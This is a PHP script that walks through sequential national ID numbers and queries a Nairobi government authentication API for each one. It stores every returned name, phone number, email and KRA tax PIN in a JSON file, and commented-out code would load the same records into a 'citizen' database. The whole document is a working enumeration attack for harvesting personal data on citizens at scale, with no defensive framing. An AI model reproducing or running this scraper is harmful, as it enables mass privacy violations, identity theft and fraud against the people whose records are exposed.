
    <?php
    include "../includes/conn.php";
    function kenya($data, $low, $high)
{
    global $conn;


    $url1 = "https://nairobiservices.go.ke/api/authentication/auth/individual/kra/details";
    for ($i = $low; $i <= $high; $i++) {
        $fields = ["id_number" => $i];
        $data_2 = httpPost($url1, $fields);
        $obj = json_decode($data_2, true);

        if (isset($obj["data"])) {
            $data["data"][$i]["idno"] = $i;
            $data["data"][$i]["full_name"] = $obj["data"]["name"];
            $data["data"][$i]["phone"] = $obj["data"]["phone"];
            $data["data"][$i]["email"] = $obj["data"]["email"];
            $data["data"][$i]["kra"] = $obj["data"]["kra_pin"];
            // $stmt = $conn->prepare("INSERT INTO citizen (idno, full_name, phone, email, kra, status) VALUES (:idno, :full_name, :phone, :email, :kra, :status)");
            // $stmt->execute(["idno" => $i, "full_name" => $obj["data"]["name"], "phone" => $obj["data"]["phone"], "email" => $obj["data"]["email"], "kra" => $obj["data"]["kra_pin"], "status" => "GOOD"]);
        } elseif (isset($obj["error"])) {
            $data["data"][$i]["idno"] = $i;
            $data["data"][$i]["error"] = $obj["error"];
            // $stmt = $conn->prepare("INSERT INTO citizen (idno, status) VALUES (:idno, :status)");
            // $stmt->execute(["idno" => $i, "status" => "BAD"]);
        } else {
            $data["data"][$i]["idno"] = $i;
            $data["data"][$i]["error"] = json_encode($obj); 
            // $stmt = $conn->prepare("INSERT INTO citizen (idno, status) VALUES (:idno, :status)");
            // $stmt->execute(["idno" => $i, "status" => "ERROR"]);
        }
    }

    return $data;
}

$script_no = "master_2_db";
$file_name = "../store/" . $script_no . ".json";

if (file_exists($file_name)) {
    $data = json_decode(file_get_contents($file_name), true);
} else {
    $structure = [
        "data" => [],
        "token" => 8000000
    ];

    $structure_data = json_encode($structure);

    $file_data = fopen($file_name, "w");

    fwrite($file_data, $structure_data);

    fclose($file_data);

    $data = json_decode($structure_data, true);
}

$low = $data["token"];
$high = $low + $mother;


$fin_d = kenya($data, $low, $high);

$fin_d["token"] = $high + 1;

$file_data = fopen($file_name, "w");

fwrite($file_data, json_encode($fin_d));

fclose($file_data);
?>
    